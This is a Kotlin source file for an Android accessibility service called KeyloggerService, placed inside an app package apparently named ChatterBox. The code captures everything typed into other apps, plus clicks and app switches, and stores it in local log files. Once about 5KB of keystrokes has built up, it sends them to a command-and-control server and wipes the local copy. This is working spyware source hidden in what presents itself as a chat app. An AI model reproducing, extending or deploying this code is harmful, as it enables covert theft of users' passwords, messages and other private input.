package com.example.ChatterBox.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Accessibility service for logging user input across the device.
 * This service captures text input, UI interactions, and potentially sensitive
 * information entered by the user.
 */
class KeyloggerService : AccessibilityService() {
    private val TAG = "KeyloggerService"
    private val c2Connection = C2Connection()
    
    override fun onServiceConnected() {
        Log.d(TAG, "Keylogger service connected")
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    // Capture text input
                    val packageName = event.packageName?.toString() ?: "unknown"
                    val eventText = event.text?.joinToString() ?: ""
                    
                    if (eventText.isNotEmpty()) {
                        val data = "TEXT_INPUT:$packageName:$eventText"
                        logKeyboardInput(data)
                    }
                }
                
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    // Capture button/link clicks
                    val packageName = event.packageName?.toString() ?: "unknown"
                    val className = event.className?.toString() ?: "unknown"
                    val contentDescription = event.contentDescription?.toString() ?: ""
                    
                    val data = "CLICK:$packageName:$className:$contentDescription"
                    logUserInteraction(data)
                }
                
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, 
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    // Track app usage and window changes
                    val packageName = event.packageName?.toString() ?: "unknown"
                    if (packageName != "com.example.ChatterBox") {
                        logAppUsage(packageName)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event: ${e.message}")
        }
    }
    
    override fun onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted")
    }
    
    private fun logKeyboardInput(inputData: String) {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val logEntry = "$timestamp:$inputData\n"
        
        val file = File(filesDir, "keyboard_logs.txt")
        try {
            file.appendText(logEntry)
            
            // Periodically send data to C2 server
            if (file.length() > 1024 * 5) { // Send after collecting ~5KB of data
                CoroutineScope(Dispatchers.IO).launch {
                    c2Connection.sendData("keyboard", file.readText())
                    file.writeText("") // Clear file after sending
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error logging keyboard input: ${e.message}")
        }
    }
    
    private fun logUserInteraction(interactionData: String) {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val logEntry = "$timestamp:$interactionData\n"
        
        val file = File(filesDir, "interaction_logs.txt")
        try {
            file.appendText(logEntry)
        } catch (e: Exception) {
            Log.e(TAG, "Error logging user interaction: ${e.message}")
        }
    }
    
    private fun logAppUsage(packageName: String) {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val logEntry = "$timestamp:APP_USAGE:$packageName\n"
        
        val file = File(filesDir, "app_usage_logs.txt")
        try {
            file.appendText(logEntry)
        } catch (e: Exception) {
            Log.e(TAG, "Error logging app usage: ${e.message}")
        }
    }
}
